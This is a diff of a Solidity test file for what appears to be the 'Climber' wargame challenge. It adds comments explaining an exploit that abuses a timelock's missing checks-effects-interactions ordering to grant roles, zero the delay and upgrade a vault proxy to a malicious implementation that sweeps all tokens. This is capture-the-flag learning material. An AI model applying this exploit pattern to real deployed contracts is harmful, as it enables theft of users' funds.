@@ -126,8 +126,12 @@ contract ClimberChallenge is Test {
 }
 
 contract MaliciousImplementation is UUPSUpgradeable {
+    //Had to make our malicious implementation upgradable other wise ERC1967InvalidImplementation(0xce110ab5927CC46905460D930CCa0c6fB4666219)] revert will happen since vault the variable which holds the older implementation and will hold newer implementation is child of UUPSUpgradeable
+    // we have to define this fn because in UUPSUpgradeable this fn is virtual and abstract
     function _authorizeUpgrade(address newImplementation) internal override {}
 
+    // we just need to match the fn name and storage slot structure
+    // only define sweepFunds because we can use it to send all the tokens held by proxy to us
     function sweepFunds(address token) external {
         SafeTransferLib.safeTransfer(
             token,
@@ -142,6 +146,7 @@ contract ExploitTimelockExecute {
 
     address newVault;
     address[] targets = new address[](4);
+    //will already have their value 0 by default which is what we want it to be so no need to initialize later
     uint256[] values = new uint256[](4);
     bytes[] dataElements = new bytes[](4);
     bytes32 salt = keccak256("salt");
@@ -157,28 +162,31 @@ contract ExploitTimelockExecute {
     }
 
     function executeAttack() public {
-        // targets[0] = address(timelock);
         targets[0] = address(vault);
         targets[1] = address(timelock);
         targets[2] = address(timelock);
         targets[3] = address(this);
 
-        values[0] = 0;
-        values[1] = 0;
-        values[2] = 0;
-        values[3] = 0;
-
+        //Upgrade vault's implementation with out malicious one
         dataElements[0] = abi.encodeCall(
             UUPSUpgradeable.upgradeToAndCall,
             (newVault, "")
         );
+        //make the delay 0 so that execute happens instantly without an delay related evert happening
         dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
+        //We grant this current exploiter contract proposer role so that it can schedule our batch for execution
         dataElements[2] = abi.encodeCall(
             AccessControl.grantRole,
             (PROPOSER_ROLE, address(this))
         );
+        /*
+
+        we make use of the lack of cei in the timelock execute implementation to schedule our execute after doing it
+        we call a separate fn which runs timelock.schedule(targets, values, dataElements, salt) inside
+        we don't call it directly because then there will be cyclical recursive relation between execute and schedule making it impossible to schedule our batch
+
+       */
         dataElements[3] = abi.encodeCall(this.maliciousScheduling, ());
-        // maliciousScheduling(targets, values, dataElements, salt);
 
         timelock.execute(targets, values, dataElements, salt);
     }
